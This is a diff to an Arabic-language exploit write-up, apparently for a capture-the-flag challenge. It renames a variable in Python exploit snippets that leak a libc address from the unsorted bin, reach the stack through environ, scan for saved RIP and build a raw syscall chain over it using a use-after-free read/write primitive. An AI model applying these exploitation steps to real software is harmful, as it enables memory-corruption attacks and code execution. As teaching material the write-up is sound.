@@ -238,13 +238,13 @@ case OP_MAP: {
 **الفرق المهم:** داخل الـ unsorted bin، الـ allocator يكتب داخل أول 8 بايت من المساحة المحررة **مؤشر يأشر على مكان جوا الـ libc نفسها** (جزء من هيكلة إدارة الذاكرة الداخلية، اسمه `main_arena`). يعني لو قدرت أقرأ أول 8 بايت من مساحة محررة وواقعة في الـ unsorted bin، بأحصل على عنوان حقيقي داخل الـ libc!
 
 ```python
-a.push(0x200).newarr().storeg(0)     # g0: مصفوفة كبيرة (0x200 عنصر → حجز 0x1000+8 بايت)
-a.push(1).newarr().storeg(1)         # g1: مصفوفة صغيرة، تستخدم كـ "حاجز" (guard)
-a.push(0).newarr().storeg(2)         # g2: رأس بدون بيانات (data = NULL) محجوز من قبل
-a.loadg(0).push(0).aresize()         # حرر data حق g0 → يروح للـ unsorted bin
-a.loadg(2).push(0x200).aresize()     # realloc(NULL, نفس الحجم) على g2 → ياخذ نفس المكان من الـ unsorted bin
-a.loadg(2).push(0).aget()            # اقرأ أول qword = عنوان جوا الـ libc (main_arena+96)
-a.push(LIBC_UNSORTED).sub().storeg(3)  # اطرح الإزاحة المعروفة مسبقاً → يطلع libc base!
+io.push(0x200).newarr().storeg(0)     # g0: مصفوفة كبيرة (0x200 عنصر → حجز 0x1000+8 بايت)
+io.push(1).newarr().storeg(1)         # g1: مصفوفة صغيرة، تستخدم كـ "حاجز" (guard)
+io.push(0).newarr().storeg(2)         # g2: رأس بدون بيانات (data = NULL) محجوز من قبل
+io.loadg(0).push(0).aresize()         # حرر data حق g0 → يروح للـ unsorted bin
+io.loadg(2).push(0x200).aresize()     # realloc(NULL, نفس الحجم) على g2 → ياخذ نفس المكان من الـ unsorted bin
+io.loadg(2).push(0).aget()            # اقرأ أول qword = عنوان جوا الـ libc (main_arena+96)
+io.push(LIBC_UNSORTED).sub().storeg(3)  # اطرح الإزاحة المعروفة مسبقاً → يطلع libc base!
 ```
 
 **ليش أحتاج `g1` (الحاجز)؟** لو ما حطيته، فالمساحة الكبيرة اللي حررتها تكون ملاصقة لآخر منطقة الـ heap (اسمها top chunk)، والـ allocator تلقائياً "يدمجها" رجوع بالـ top بدل ما يحطها في الـ unsorted bin — فأخسر الـ leak. الحاجز عبارة عن مصفوفة صغيرة أحطها بينهم عشان تمنع هذا الدمج.
@@ -275,10 +275,10 @@ g2 الآن يملك نفس المساحة، وأول 8 بايت منها لسا
 لكن كيف أوصل من الـ libc للـ Stack؟ الـ libc عندها متغير عام اسمه `environ`، وهو مؤشر يأشر على أول عنصر في مصفوفة متغيرات البيئة (environment variables) — وهذي المصفوفة موجودة **على الـ Stack نفسها**! يعني `environ` هو "جسر" بين الـ libc والـ Stack.
 
 ```python
-a.loadg(3).push(LIBC_ENVIRON).add().storeg(8)   # g8 = عنوان environ (libc_base + إزاحة معروفة)
-a.push(0x100).storeg(9)                         # g9 = طول القراءة
-a.call('mk_uaf')                                # استخدم نفس سلاح الـ arbitrary read/write
-a.loadg(7).push(0).aget().storeg(4)             # g4 = قيمة environ = عنوان على الـ Stack!
+io.loadg(3).push(LIBC_ENVIRON).add().storeg(8)   # g8 = عنوان environ (libc_base + إزاحة معروفة)
+io.push(0x100).storeg(9)                         # g9 = طول القراءة
+io.call('mk_uaf')                                # استخدم نفس سلاح الـ arbitrary read/write
+io.loadg(7).push(0).aget().storeg(4)             # g4 = قيمة environ = عنوان على الـ Stack!
 ```
 
 ببساطة: استخدمت نفس "السلاح" اللي بنيته فوق (الـ arbitrary read primitive)، بس هالمرة وجههته على عنوان `environ` بدل عنوان عشوائي، فقريت القيمة المخزنة فيه، وطلعت لي عنوان حقيقي داخل الـ Stack.
@@ -301,9 +301,9 @@ a.loadg(7).push(0).aget().storeg(4)             # g4 = قيمة environ = عنو
 الحل: أسوي "مسح" (scan) بسيط — أقرأ qword وحده وحده في منطقة واسعة تحت `environ`، وأقارن كل وحدة بالقيمة اللي أتوقعها:
 
 ```python
-a.loadg(4).push(0x1000).sub().storeg(8)   # ابدأ البحث من 0x1000 بايت تحت environ
-a.push(0x400).storeg(9)                   # امسح 0x400 خانة (0x2000 بايت)
-a.call('mk_uaf')                          # ثبّت primitive القراءة على هالمنطقة
+io.loadg(4).push(0x1000).sub().storeg(8)   # ابدأ البحث من 0x1000 بايت تحت environ
+io.push(0x400).storeg(9)                   # امسح 0x400 خانة (0x2000 بايت)
+io.call('mk_uaf')                          # ثبّت primitive القراءة على هالمنطقة
 
 # حلقة scan:
 # لكل i من 0 إلى 0x400:
@@ -340,9 +340,9 @@ a.call('mk_uaf')                          # ثبّت primitive القراءة ع
 
 ```python
 def aset(idx, v):
-    a.loadg(7).loadg(11).push(idx).add()   # index = g11 (مكان saved RIP) + idx
+    io.loadg(7).loadg(11).push(idx).add()   # index = g11 (مكان saved RIP) + idx
     pushx(v)
-    a.aset()
+    io.aset()
 ```
 
 وجهّزت دالة بايثون صغيرة سميتها `syscall()` (انتبهوا: هذا اسم دالة من عندي بالسكربت، مختلف عن دالة `syscall()` الحقيقية حق الـ libc اللي بنشرحها بعدين) تبني لي raw syscall بترتيب المعاملات الصح حسب اتفاقية الكيرنل (`RDI, RSI, RDX, RAX`):
